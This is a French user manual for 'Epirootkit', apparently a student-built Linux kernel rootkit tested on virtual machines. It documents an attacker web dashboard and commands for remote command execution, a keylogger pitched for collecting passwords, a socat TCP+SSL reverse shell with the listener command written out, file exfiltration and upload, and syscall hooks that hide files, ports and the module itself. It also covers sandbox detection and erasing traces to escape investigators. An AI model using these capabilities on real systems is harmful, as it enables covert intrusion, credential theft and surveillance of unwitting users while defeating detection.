# Utilisation
\tableofcontents

L’utilisation du rootkit peut se faire soit en ligne de commande, soit via l’interface graphique intégrée. Nous allons ici décrire les deux méthodes.

> Pour tirer pleinement parti de cette section, veuillez d’abord vous assurer que la mise en place a été correctement effectuée, comme décrit précédemment dans la section [Mise en place](02_install.md).

Dans un premier temps, nous expliquerons comment interagir avec l’interface web. Ensuite, nous détaillerons l’ensemble des commandes de base permettant d’interagir à distance avec le rootkit, accessibles aussi bien en ligne de commande (CLI) côté attaquant qu’à travers des boutons ou des champs de saisie dans l’interface graphique.

## 🌐 Interface Web

### 1. Connexion {#connexion}

Normalement, à ce stade, vous devriez avoir les deux machines virtuelles ouvertes, avec le serveur Python en cours d’exécution, ainsi que l’interface web si vous avez choisi cette option. Vous devriez alors voir un écran similaire à celui présenté ci-dessous. Le rootkit est détecté et connecté, mais une authentification est nécessaire pour accéder à l’ensemble des fonctionnalités et contrôler la machine victime à distance. Cliquez ensuite sur Authenticate et saisissez le mot de passe `evannounet`. Après quelques instants, le tableau de bord principal de l’application devrait s’afficher.
\htmlonly
<figure style="text-align: center;">
  <img 
    src="../../../img/connect.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's web ui with rootkit connected.
  </figcaption>
</figure>
\endhtmlonly
\htmlonly
<figure style="text-align: center;">
  <img 
    src="../../../img/authent.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's web ui while authenticating.
  </figcaption>
</figure>
\endhtmlonly

> Pour plus d’informations techniques concernant la gestion du mot de passe, voir [Gestion du mot de passe](#gestion-du-mot-de-passe).

### 2. Dashboard {#dashboard}

\htmlonly
<figure style="text-align: center;">
  <img 
    src="../../../img/dash.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's dashboard after authentication.
  </figcaption>
</figure>
\endhtmlonly

Une fois connecté et authentifié, le tableau de bord principal (dashboard) s’affiche. Il permet un aperçu global de l’état de la machine cible, ainsi qu’un accès rapide à certaines fonctionnalités du rootkit. Voici les différents éléments présents ci-dessous.

#### ✅ Connexion
<div class="full_width_table">
| Élément             | Description                                                                 |
|:---------------------|:-----------------------------------------------------------------------------|
| **Status**          | Indique que le rootkit est bien connecté à la machine cible.                |
| **IP**              | Adresse IP locale de la machine cible (ici `192.168.100.3`).                |
| **Port**            | Port utilisé pour la connexion (ici `4242`).                                |
| **Time**            | Heure actuelle sur la machine victime.                                      |
| **Last Command**    | Affiche la dernière commande envoyée à la cible.                            |
| **Avertissement VM**| Affiche un message d’alerte si le rootkit détecte un environnement virtuel. |
</div>

#### 🛠 Actions
<div class="full_width_table">
| Action              | Description                                                                 |
|:---------------------|:-----------------------------------------------------------------------------|
| **Disconnect**      | Permet de fermer proprement la connexion avec la cible.                     |
| **Kill rootkit**    | Met un terme à l’exécution du rootkit sur la machine cible                  |
</div>

#### 🖥 Système
<div class="full_width_table">
| Élément             | Description                                                                 |
|:---------------------|:-----------------------------------------------------------------------------|
| **Architecture**    | Architecture processeur de la machine (ici `x86_64`).                       |
| **CPU Cores**       | Nombre de cœurs processeur détectés (ici `1 cœur`).                         |
| **CPU Model**       | Nom du processeur ou de l’émulateur utilisé (ici `QEMU Virtual CPU`).       |
| **Hostname**        | Nom d’hôte de la machine (ici `victim`).                                    |
| **RAM**             | Quantité totale de RAM disponible (ici `3889 Mo`).                          |
| **Version kernel**  | Version du noyau Linux (ici `6.8.0-60-generic`).                            |
| **Version OS**      | Détail de la distribution Linux et son build.                               |
| **Virtual Env**     | Indique si la machine semble tourner dans une VM (ici `true`).              |
</div>
#### 💻 Reverse shell {#reverse-shell}
<div class="full_width_table">
| Élément             | Description                                                                 |
|:---------------------|:-----------------------------------------------------------------------------|
| **Champ de port**   | Permet de spécifier un port sur lequel ouvrir un shell inversé.             |
| **Launch Shell**    | Lance le shell distant sur le port défini.                                  |
</div>

> **Attention :** Le bouton *Launch Shell* ouvre un terminal Kitty sur la machine d'attaque. Par conséquent, le serveur web **et** le navigateur doivent être lancés dans la VM d'attaque pour que cette fonctionnalité fonctionne correctement.

#### 💾 Disque

Un aperçu est fourni via la commande distante `df -h` exécutée sur la machine virtuelle victime, indiquant les différentes partitions, leur taille, l’espace utilisé/disponible et leur point de montage.

#### 📊 Ressources

Un petit graphique à droite affiche en temps réel :
<div class="full_width_table">
| Ressource           | Couleur d'affichage  |
|:--------------------|:---------------------|
| **CPU (%)**         | Rouge                |
| **RAM (%)** n       | Bleu                 |
</div>

### 3. Terminal {#terminal}

L’onglet **Terminal** permet de prendre le contrôle de la machine cible à distance en exécutant des commandes comme si l’on utilisait un terminal local.
\htmlonly
<figure style="text-align: center;">
  <img 
    src="../../../img/terminal.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the attacker's terminal interface for remote command execution.
  </figcaption>
</figure>
\endhtmlonly

#### 🖥️ Interface
<div class="full_width_table">
| Élément      | Description                                                                                     |
|:-------------|:------------------------------------------------------------------------------------------------|
| **Commande** | Saisissez ici une commande Unix/Linux classique (ex. : `ls -la`, `whoami`).                     |
| **Send**     | Permet d’envoyer la commande à la machine cible.                                                |
| **Mode TCP** | Connexion directe via TCP. Timeout de 5 s. côté rootkit pour éviter les blocages (ex. : `ping`).|
| **Mode DNS** | Commande via DNS. Timeout de 30 s.  |
</div>

#### 📄 Résultats
<div class="full_width_table">
Les résultats de l'exécution apparaissent dans deux blocs distincts :
| Élément             | Description                                   |
|:--------------------|:----------------------------------------------|
| **stdout**          | Contenu de la sortie standard de la commande. |
| **stderr**          | Contenu de la sortie d’erreur de la commande. |
| **Code de sortie**  | Code de terminaison de la commande            |
</div>

#### 🕘 Historique 

En bas de l’écran, une section intitulée *Command history* permet de consulter les commandes précédemment envoyées à la machine cible. Chaque commande est accompagnée de son résultat, affiché dans un bloc repliable afin de préserver la lisibilité de l’interface. Cette fonctionnalité facilite à la fois le suivi des actions réalisées, le débogage en cas de problème, et la réutilisation rapide de commandes fréquentes.

### 4. Explorer

L’onglet **Explorer** permet d’explorer le système de fichiers de la machine victime, offrant une vue hiérarchique des répertoires et des fichiers présents sur celle-ci.

\htmlonly
<figure style="text-align: center;">
  <img 
    src="../../../img/explorer.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the file explorer interface in the attacker's web UI.
  </figcaption>
</figure>
\endhtmlonly

#### Victim's File Explorer
La partie de gauche de l’interface affiche la structure des répertoires de la machine victime. Vous pouvez naviguer dans les dossiers en cliquant sur les noms des répertoires. Les fichiers et sous-répertoires sont listés avec leurs noms, dans un ordre alphabétique en commençant par les répertoires, suivis des fichiers. Les répertoires sont indiqués par une icône de dossier, tandis que les fichiers sont représentés par une icône de document.

Lors du survol d'un fichier, deux icônes apparaissent à droite de la barre de sélection :
- **📥 Télécharger** : Permet de télécharger le fichier sélectionné sur la machine attaquante.

> **Note** : Le téléchargement se fait en deux étapes :
  1. Le fichier est transféré de la machine victime vers le serveur web (machine) de l'attaquant.
  2. Il est ensuite téléchargé sur la machine attaquante via le navigateur.
  Une fois le fichier téléchargé, son nom apparait dans la section **Downloaded Files**, où il peut être téléchargé à nouveau via le navigateur ou supprimé.

- **❌ Supprimer** : Permet de supprimer le fichier sélectionné de la machine victime.

#### File Upload
La partie de droite de l’interface permet de télécharger des fichiers depuis la machine attaquante vers la machine victime. Vous pouvez sélectionner un fichier à partir de votre système local en cliquant sur le bouton **Browse**. Une fois le fichier sélectionné, le path de destination sur la machine victime est affiché dans le champ de saisie. Vous pouvez alors modifier le nom du fichier directement dans le champ de saisie ou le path de destination (par défaut la position actuelle dans l'explorateur) en cliquant dessus, ce qui fera apparaitre un champ de saisie modifiable. 

Une fois le nom du fichier ou le path de destination modifié, vous pouvez cliquer sur le bouton **Upload** pour envoyer le fichier vers la machine victime.

> **Note** : Il n'y a pas de contrainte de type de fichier, vous pouvez envoyer n'importe quel fichier, qu'il soit exécutable ou non. 
  Pour ce qui est de la taille maximum, celle-ci est théoriquement de 4TB (voir l'explication du [protocole utilisé](#tcp-protocole) pour plus de détails).

#### Hidden dirs/files
La dernière partie de l'interface permet d'afficher les fichiers et dossiers masqués par le rootkit (voir commande `hooks list_hide` dans la [liste des commandes](#liste-des-commandes)). Les afficher ici permet d'avoir connaissance de leur existance malgré leur absence visuelle de l'explorateur de fichiers.

> **Note** : Il est toujours possible de manipuler ces fichiers et dossier masqués mais il faudra pour cela passer par le [Terminal](#terminal).

### 5. Keylogger {#keylogger}

L’onglet **Keylogger** permet de récupérer les frappes clavier effectuées sur la machine victime. Cette fonctionnalité est particulièrement utile pour collecter des mots de passe, des requêtes tapées dans un navigateur, ou encore pour surveiller l’activité de la victime.
\htmlonly
<figure style="text-align: center;">
  <img 
    src="../../../img/keylogger.png" 
    style="
      margin: 30px 0px 0px;
      border-radius: 8px; 
      width: 100%;
    "
  />
  <figcaption style="margin-top: 0.5em; font-style: italic;">
    Figure: Screenshot of the keylogger interface in the attacker's web UI.
  </figcaption>
</figure>
\endhtmlonly

#### ⌨️ Frappes
Une zone de texte centrale affiche le contenu capturé par le module de keylogging sous forme brute, sans mise en forme, exactement tel qu’il est stocké sur la machine cible. Le bouton *Fetch data* permet de récupérer les nouvelles frappes enregistrées depuis le module rootkit. L’état du module est représenté par un *switch ON/OFF* : lorsqu’il est activé, toutes les frappes clavier sont enregistrées en temps réel ; lorsqu’il est désactivé, aucune donnée n’est collectée.

#### 🔍 Recherche
Un champ de recherche permet de filtrer dynamiquement les résultats affichés. Deux modes sont disponibles : en mode *Normal*, la recherche s’effectue en texte brut, tandis que le mode *RegEx* active la prise en charge des expressions régulières, offrant ainsi des possibilités de filtrage avancées. Une fois les critères saisis, le bouton *Search* permet d’appliquer le filtre sur les données visibles.

#### 📦 Exportation
Le bouton *Download as .txt* permet de télécharger l’ensemble des frappes capturées sous forme d’un fichier `.txt` directement sur la machine attaquante.

## 📜 Liste des commandes {#liste-des-commandes}

La liste des commandes décrites ci-dessous sont des commandes propres à Epirootkit, qui peuvent être saisies dans le terminal de la machine attaquante après s’être connecté au rootkit. Beaucoup de ces commandes sont également accessibles de manière indirecte via l’interface web, que ce soit par des boutons ou des champs de saisie. Cela n'est cependant pas le cas de toutes les commandes, certaines étant réservées à un usage en ligne de commande (CLI) pour des raisons de sécurité ou de complexité et c'est pour cette usage que nous les décrivons ici.

Voici la liste des commandes disponibles, regroupées par thème :

<div class="full_width_table">
| Thème                | Commandes                                                                                                                                                                                                                   |
|----------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Accès                | <a href="#connect">connect</a> │ <a href="#disconnect">disconnect</a> │ <a href="#killcom">killcom</a>                                                                                                                                            |
| Authentification     | <a href="#help">help</a> │ <a href="#passwd">passwd</a>                                                                                                                                                                                     |
| Contrôle système     | <a href="#exec">exec</a> │ <a href="#getshell">getshell</a> │ <a href="#sysinfo">sysinfo</a> │ <a href="#is_in_vm">is_in_vm</a>                                                                                                                        |
| Keylogger            | <a href="#klgon">klgon</a> │ <a href="#klgoff">klgoff</a> │ <a href="#klg">klg</a>                                                                                                                                                                |
| Masquage module      | <a href="#hide_module">hide_module</a> │ <a href="#unhide_module">unhide_module</a>                                                                                                                                                         |
| Fichiers             | <a href="#get_file">get_file</a> │ <a href="#upload">upload</a>                                                                                                                                                                             |
| Diagnostic           | <a href="#ping">ping</a>                                                                                                                                                                                                              |
| Hooks (général)      | <a href="#hooks-help">hooks help</a>                                                                                                                                                                                                  |
| Hooks : fichiers     | <a href="#hooks-hide">hooks hide</a> │ <a href="#hooks-unhide">hooks unhide</a> │ <a href="#hooks-list_hide">hooks list_hide</a>                                                                                                                  |
| Hooks : interdiction | <a href="#hooks-forbid">hooks forbid</a> │ <a href="#hooks-unforbid">hooks unforbid</a> │ <a href="#hooks-list_forbid">hooks list_forbid</a>                                                                                                      |
| Hooks : modification | <a href="#hooks-modify">hooks modify</a> │ <a href="#hooks-unmodify">hooks unmodify</a> │ <a href="#hooks-list_modify">hooks list_modify</a>                                                                                                      |
| Hooks : ports        | <a href="#hooks-add_port">hooks add_port</a> │ <a href="#hooks-remove_port">hooks remove_port</a> │ <a href="#hooks-list_port">hooks list_port</a>                                                                                                |
</div>
<details open>
<summary id="help"><b>1. 🆘 help</b></summary>

**Syntaxe**
```bash
help
```

**Description**  
Affiche un menu récapitulatif de toutes les commandes disponibles pour l'attaquant. Certaines commandes affichées sont optimisées pour l'interface Web.

</details>

<details open>
<summary id="connect"><b>2. 🔌 connect</b></summary>

**Syntaxe**
```bash
connect [PASSWORD]
```

**Description**  
Permet d'authentifier l'attaquant pour accéder au rootkit à distance.

**Paramètres**
- **PASSWORD** : Mot de passe d'authentification au rootkit (par défaut `evannounet`)

**Notes importantes**
- La connexion est nécessaire pour exécuter d'autres commandes
- Seules les commandes <a href="#help">help</a>, <a href="#connect">connect</a> et <a href="#ping">ping</a> sont accessibles sans authentification
- Le mot de passe peut être modifié ultérieurement avec la commande <a href="#passwd">passwd</a>
</details>

<details open>
<summary id="disconnect"><b>3. 🔌 disconnect</b></summary>

**Syntaxe**
```bash
disconnect
```

**Description**  
Commande complémentaire de <a href="#connect">connect</a>. Permet de se déconnecter proprement du rootkit distant.

**Comportement**
- Une reconnexion sera nécessaire pour saisir de nouvelles commandes
- Ne termine pas l'execution du rootkit contrairement à <a href="#killcom">killcom</a>.

</details>

<details open>
<summary id="ping"><b>4. 📡 ping</b></summary>

**Syntaxe**
```bash
ping
```

**Description**  
Teste la connectivité du rootkit.

**Réponse attendue**
- **Succès** : La console renvoie `pong`
- **Échec** : Aucune réponse ou erreur de connexion

</details>

<details open>
<summary id="passwd"><b>5. 🔐 passwd</b></summary>

**Syntaxe**
```bash
passwd [PASSWORD]
```

**Description**  
Modifie le mot de passe actuellement utilisé pour se connecter au rootkit.

**Paramètres**
- **PASSWORD** : Nouveau mot de passe

**Fonctionnement**
- Le mot de passe est haché automatiquement
- Stockage sécurisé en interne sur la machine victime

**Exemple**
```bash
passwd root
```

</details>

<details open>
<summary id="exec"><b>6. 🖥️ exec</b></summary>

**Syntaxe**
```bash
exec [OPTIONS] [COMMAND]
```

**Description**  
Exécute du code Bash dans l'espace utilisateur (userland) de la machine victime.

**Options**
- **-s** : Mode silencieux (évite l'affichage de la sortie, retourne uniquement le code de retour)

**Sortie par défaut**
- Contenu de *stdout*
- Contenu de *stderr*  
- Code de retour de la commande

**Exemples**
```bash
exec ls                    # Liste les fichiers
exec man man              # Affiche le manuel
exec -s whoami            # Mode silencieux
exec ping 8.8.8.8         # Test de connectivité
```

</details>

<details open>
<summary id="klgon"><b>7. 👁️ klgon</b></summary>

**Syntaxe**
```bash
klgon
```

**Description**  
Active le keylogger sur la machine victime.

**Fonctionnement**
- Enregistrement de toutes les frappes clavier
- Fonctionnement en arrière-plan
- Stockage des données pour récupération ultérieure

> **Note** : Utilisation du keylogger possible directement depuis l’onglet [Keylogger](#keylogger) de l'interface web.

</details>

<details open>
<summary id="klgoff"><b>8. 👁️ klgoff</b></summary>

**Syntaxe**
```bash
klgoff
```

**Description**  
Désactive le keylogger sur la machine victime.

**Effet**
- Arrêt immédiat de l'enregistrement des frappes
- Les données déjà collectées restent disponibles

> **Note** : Utilisation du keylogger possible directement depuis l’onglet [Keylogger](#keylogger) de l'interface web.

</details>

<details open>
<summary id="klg"><b>9. 📝 klg</b></summary>

**Syntaxe**
```bash
klg
```

**Description**  
Récupère les frappes clavier enregistrées par le keylogger.

**Format de sortie**
- **Contenu brut** sans mise en forme
- **Touches spéciales** représentées par des chaînes spécifiques
  - Exemple : `_LSHIFT_` pour la touche Majuscule gauche

> **Note** : Utilisation du keylogger et fonctionnalitées avancées disponibles directement depuis l’onglet [Keylogger](#keylogger) de l'interface web.

</details>

<details open>
<summary id="getshell"><b>10. 🐚 getshell</b></summary>

**Syntaxe**
```bash
getshell [port]
```

**Description**  
Ouvre un shell inversé (reverse shell) sécurisé sur la machine cible en utilisant une connexion TCP+SSL.

**Paramètres**
- **port** *(optionnel)* : Port de connexion personnalisé
  - **Défaut** : `9001`
  - **Exemple** : `getshell 9042` utilise le port 9042

**Fonctionnement technique**  
Le reverse shell utilise un binaire **socat** compilé statiquement, intégré au module rootkit :

1. **Déploiement** : Le binaire est installé dans `/var/lib/systemd/.epirootkit-hidden-fs/.sysd` lors de l'insertion du module
2. **Connexion** : Établissement d'une connexion TCP+SSL vers l'attaquant sur le port spécifié
3. **Exécution** : L'attaquant peut exécuter des commandes à distance comme s'il était connecté localement
4. **Interactivité** : Shell complètement interactif grâce aux paramètres d'exécution spécifiques du binaire

**Configuration côté attaquant**  
L'attaquant doit avoir une instance socat en écoute avec le certificat SSL correspondant :

```bash
socat openssl-listen:9042,reuseaddr,cert="$(pwd)"/server.pem,verify=0 file:"$(tty)",raw,echo=0
```

**Interface web**  
Dans l'interface web :
- Spécifiez le port dans le champ dédié
- Le serveur socat est lancé automatiquement en arrière-plan en utilisant le terminal **Kitty**
- Cliquez sur le bouton **Launch Shell** pour ouvrir le shell inversé

> **Note** : Le reverse shell est disponible directement depuis l’onglet **Shell** du [Dashboard](#dashboard) de l'interface web.

</details>

<details open>
<summary id="killcom"><b>11. 💀 killcom</b></summary>

**Syntaxe**
```bash
killcom
```

**Description**  
Coupe la communication avec le rootkit et supprime le module via `rmmod`.

**Usage recommandé**
- **Développement et tests** uniquement
- **Production** : Utilisez plutôt `disconnect` pour une déconnexion simple.

**Effet destructeur**  
Cette commande détruit complètement le module, nécessitant une réinstallation sur la machine victime pour le réactiver.

> S'il venait à arriver que le rootkit soit détecté par des outils spécialisés (par exemple par la DGSI ou Laurence C. ), la commande `killcom` peut alors s'avérer d'une grande utilité afin de supprimer toute trace du rootkit et disparaitre tel XDDL.


</details>

<details open>
<summary id="hide_module"><b>12. 🙈 hide_module</b></summary>

**Syntaxe**
```bash
hide_module
```

**Description**  
Masque le module noyau en le retirant de la liste chaînée des modules maintenue par le noyau Linux.

**Avantages**
- Indétectable par les outils système classiques
- Persistance accrue du rootkit
- Contournement des outils de détection standards

</details>

<details open>
<summary id="unhide_module"><b>13. 👀 unhide_module</b></summary>

**Syntaxe**
```bash
unhide_module
```

**Description**  
Opération inverse de [`hide_module`](#hide_module). Rétablit le module précédemment masqué en le réinsérant dans la liste des modules du noyau.

**Usage**
- Permet la visibilité temporaire du module
- Utile pour narguer les outils de détection lorque la partie de cache-cache est trop longue

</details>

<details open>
<summary id="get_file"><b>14. 📥 get_file</b></summary>

**Syntaxe**
```bash
get_file ######### TODO #########
```

**Description**  
- Permet de transférer un fichier de la machine victime vers la machine attaquante.
- Fonctionne de manière sécurisée en utilisant le protocole TCP+SSL.

**Fonctionnalités probables**
- Exfiltration de données

</details>

<details open>
<summary id="upload"><b>15. 📤 upload</b></summary>

**Syntaxe**
```bash
upload ######### TODO #########
```

**Description**  
- Permet de transférer un fichier de la machine attaquante vers la machine victime.
- Fonctionne de manière sécurisée en utilisant le protocole TCP+SSL.

**Fonctionnalités probables**
- Déploiement d'outils supplémentaires
- Installation de payloads
- Mise à jour du rootkit
- Transfert de fichiers de configuration

</details>

<details open>
<summary id="sysinfo"><b>16. 🧠 sysinfo</b></summary>

**Syntaxe**
```bash
sysinfo
```

**Description**  
- Affiche les informations système de la machine victime.

**Informations retournées**
- **architecture** : Architecture processeur
- **cpu_cores** : Nombre de cœurs CPU
- **cpu_model** : Modèle du processeur
- **hostname** : Nom d’hôte de la machine
- **ram_mb** : Quantité de RAM en Mo
- **release** : Version du noyau Linux
- **system** : Système d’exploitation
- **version** : Détail complet du noyau
- **virtual_env** : Indique si la machine est virtualisée

**Exemple de sortie**
```yaml
architecture: x86_64
cpu_cores: 1
cpu_model: QEMU Virtual CPU version 2.5+
hostname: victim
ram_mb: 3889
release: 6.8.0-58-generic
system: Linux
version: "#60~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 28 16:09:21 UTC 2"
virtual_env: true
```
</details>

<details open>
<summary id="is_in_vm"><b>17. 🖥️ is_in_vm</b></summary>

**Syntaxe**
```bash
is_in_vm
```

**Description**  
- Détecte si le rootkit s'exécute dans un environnement virtualisé.

**Détection possible**
- Hyperviseurs (VMware, VirtualBox, Hyper-V)
- Conteneurs Docker
- Machines virtuelles cloud
- Environnements de sandboxing

**Utilité**
- Adaptation du comportement selon l'environnement
- Évasion des analyses en bac à sable

</details>

<details open>
<summary id="hooks"><b>18. 🪝 Hooks</b></summary>

**Vue d'ensemble des Hooks**

**Description générale**  
Le système de hooks permet d'intercepter les appels système (syscalls) sur la machine victime. Toutes les commandes de cette section doivent être précédées de `hooks`.

**Fonctionnement**  
Des fichiers de configuration sont récupérés à chaque insertion du module et mis à jour régulièrement pour maintenir le comportement des altérations.

> ⚠️ **Important**  
> - Les fonctionnalités sont **persistantes**  
> - Non affectées par un redémarrage système  
> - Maintenues tant que le module est inséré  
> - Configuration sauvegardée et rechargée automatiquement  

**Commandes Hooks disponibles**

<details open>
<summary id="hooks-help"><b>hooks help</b></summary>

**Syntaxe**
```bash
hooks help
```

**Description**  
Affiche un menu récapitulatif de toutes les commandes `hooks` disponibles.

</details>

<details open>
<summary id="hooks-hide"><b>hooks hide</b></summary>

**Syntaxe**
```bash
hooks hide [PATH]
```

**Description**  
Masque un fichier ou un dossier spécifique en fournissant son chemin absolu.

**Fonctionnement technique**
- Interception du syscall `getdents64`
- Filtrage du contenu lors de l'énumération des fichiers
- Masquage automatique des fichiers commençant par `stdbool_bypassed_ngl_`

**Paramètres**
- **PATH** : Chemin absolu du fichier/dossier à masquer

</details>

<details open>
<summary id="hooks-unhide"><b>hooks unhide</b></summary>

**Syntaxe**
```bash
hooks unhide [PATH]
```

**Description**  
Annule l'effet de la commande `hooks hide` en rendant à nouveau visible le fichier ou dossier ciblé.

**Paramètres**
- **PATH** : Chemin absolu du fichier/dossier à révéler

</details>

<details open>
<summary id="hooks-list_hide"><b>hooks list_hide</b></summary>

**Syntaxe**
```bash
hooks list_hide
```

**Description**  
Affiche la liste complète des chemins absolus de tous les fichiers et répertoires masqués.

**Utilité**
- Audit des éléments cachés
- Gestion centralisée des masquages

</details>

<details open>
<summary id="hooks-forbid"><b>hooks forbid</b></summary>

**Syntaxe**
```bash
hooks forbid [PATH]
```

**Description**  
Interdit l'accès à un fichier ou dossier sans le masquer, même pour l'utilisateur root.

**Syscalls interceptés**
- `openat`, `newfstatat`, `fstat`, `lstat`, `stat`, `chdir`

**Comportement**  
Retourne l'erreur `-ENOENT` (*No such file or directory*) comme si l'élément n'existait pas.

**Paramètres**
- **PATH** : Chemin absolu du fichier/dossier à interdire

</details>

<details open>
<summary id="hooks-unforbid"><b>hooks unforbid</b></summary>

**Syntaxe**
```bash
hooks unforbid [PATH]
```

**Description**  
Annule l'effet de la commande `hooks forbid`.

**Paramètres**
- **PATH** : Chemin absolu du fichier/dossier à débloquer

</details>

<details open>
<summary id="hooks-list_forbid"><b>hooks list_forbid</b></summary>

**Syntaxe**
```bash
hooks list_forbid
```

**Description**  
Affiche la liste complète des chemins absolus de tous les fichiers et répertoires interdits.

</details>

<details open>
<summary id="hooks-modify"><b>hooks modify</b></summary>

**Syntaxe**
```bash
hooks modify [PATH] [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]
```

**Description**  
Interception de l'appel système `read()` permettant de modifier dynamiquement le contenu des fichiers.

**Fonctionnalités**
- **Masquer une ligne précise** : `hide_line=N`
- **Masquer les lignes contenant un mot-clé** : `hide_substr=TXT`
- **Remplacer des mots-clés** : `replace=SRC:DST`

**Paramètres**
- **PATH** : Chemin absolu du fichier (obligatoire)
- **hide_line** : Numéro de ligne à masquer
- **hide_substr** : Sous-chaîne à masquer dans toutes les lignes
- **replace** : Remplacement au format `source:destination`

**Limitations**  
- Comportement imprévisible avec des fichiers très longs
- Les espaces ne sont pas pris en charge
- Fonctionnement primitif

**Exemples**
```bash
hooks modify /home/victim/test.txt hide_line=3 hide_substr=claire replace=efrei:epita
hooks modify /home/victim/test.txt hide_substr=claire replace=efrei:epita
hooks modify /home/victim/test.txt replace=efrei:epita hide_substr=claire
hooks modify /home/victim/test.txt hide_substr=claire hide_line=10
hooks modify /home/victim/test.txt hide_line=1
```

</details>

<details open>
<summary id="hooks-unmodify"><b>hooks unmodify</b></summary>

**Syntaxe**
```bash
hooks unmodify [PATH]
```

**Description**  
Annule l'effet de la commande `hooks modify`.

**Paramètres**
- **PATH** : Chemin absolu du fichier à restaurer

</details>

<details open>
<summary id="hooks-list_modify"><b>hooks list_modify</b></summary>

**Syntaxe**
```bash
hooks list_modify
```

**Description**  
Affiche la liste complète des chemins absolus de tous les fichiers modifiés.

</details>

<details open>
<summary id="hooks-add_port"><b>hooks add_port</b></summary>

**Syntaxe**
```bash
hooks add_port [PORT]
```

**Description**  
Masque des ports spécifiques dans les fichiers système et les outils réseau.

**Cibles affectées**
- Fichiers `/proc/net/tcp*`
- Commandes `ss`
- Commandes `netstat`

**Comportement**  
Masque toutes les lignes mentionnant un port source ou destination égal à `[PORT]`.

**Paramètres**
- **PORT** : Numéro de port à masquer

</details>

<details open>
<summary id="hooks-remove_port"><b>hooks remove_port</b></summary>

**Syntaxe**
```bash
hooks remove_port [PORT]
```

**Description**  
Annule l'effet de la commande `hooks add_port`.

**Paramètres**
- **PORT** : Numéro de port à révéler

</details>

<details open>
<summary id="hooks-list_port"><b>hooks list_port</b></summary>

**Syntaxe**
```bash
hooks list_port
```

**Description**  
Affiche la liste complète de tous les ports actuellement masqués.

</details>

</details>

<img 
  src="logo_no_text.png" 
  style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  "
/>

<div class="section_buttons">

| Previous                          | Next                               |
|:----------------------------------|-----------------------------------:|
| [Architecture](03_archi.md)       |[Environnement](05_env.md)          |
</div>